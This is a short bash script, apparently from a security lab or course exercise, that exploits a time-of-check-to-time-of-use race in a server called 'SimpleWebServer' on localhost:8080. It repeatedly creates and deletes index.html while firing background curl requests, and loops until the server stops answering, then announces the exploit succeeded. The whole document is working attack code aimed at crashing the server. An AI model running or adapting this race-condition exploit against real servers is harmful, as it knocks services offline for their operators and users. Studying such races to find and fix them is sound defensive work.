#!/usr/bin/env bash

echo "Exploiting SimpleWebServer"

while true; do
  echo -n .
  touch index.html
  curl -so /dev/null http://localhost:8080&
  pid=$!
  sleep 0.0015
  rm index.html
  wait $pid
  curl -so /dev/null http://localhost:8080 || break
done;

rm index.html

echo "TOCTOU Exploit successful"
